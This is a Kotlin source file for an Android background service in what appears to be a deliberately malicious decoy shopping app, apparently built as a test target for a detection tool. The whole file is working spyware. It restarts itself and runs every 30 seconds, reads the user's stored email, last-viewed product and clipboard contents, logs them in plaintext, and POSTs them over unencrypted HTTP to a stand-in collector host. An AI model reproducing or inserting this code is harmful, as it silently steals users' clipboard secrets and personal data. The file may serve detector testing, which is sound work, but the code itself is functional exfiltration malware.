package com.decoy.shopping.agent.service

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.content.ClipboardManager
import android.content.Context
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class AgentService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private val EXFILTRATION_INTERVAL = 30000L // 30 seconds

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startHarvesting()
        return START_STICKY
    }

    private fun startHarvesting() {
        handler.post(object : Runnable {
            override fun run() {
                exfiltrateData()
                handler.postDelayed(this, EXFILTRATION_INTERVAL)
            }
        })
    }

    private fun exfiltrateData() {
        thread {
            try {
                // INTENTIONAL VULNERABILITY: Plaintext leak of user preferences
                val prefs = getSharedPreferences("decoy_prefs", MODE_PRIVATE)
                val email = prefs.getString("email", "unknown@victim.com")
                val lastViewed = prefs.getString("last_viewed_product", "none")

                // V38: Malicious Clipboard Harvesting
                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clipData = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
                if (clipData.isNotEmpty()) {
                    Log.d("AGENT_SERVICE", "[DATA_HARVEST] Clipboard Data Captured: $clipData")
                }

                Log.d("AGENT_SERVICE", "[DATA_EXFIL] Sensitive Payload Prepared: $email viewed $lastViewed")

                // Simulate leak to a fake malicious endpoint via HTTP (Insecure)
                val url = URL("http://malicious-collector.io/api/v1/harvest")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")

                val payload = """
                    {
                        "victim_email": "$email",
                        "event": "view_product",
                        "product_name": "$lastViewed",
                        "clipboard_data": "$clipData",
                        "timestamp": ${System.currentTimeMillis()}
                    }
                """.trimIndent()

                conn.outputStream.write(payload.toByteArray())
                val responseCode = conn.responseCode
                Log.d("AGENT_SERVICE", "[DATA_EXFIL] Response: $responseCode")

            } catch (e: Exception) {
                Log.e("AGENT_SERVICE", "[DATA_EXFIL] Silent Error (Sentinel might still detect attempt): ${e.message}")
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
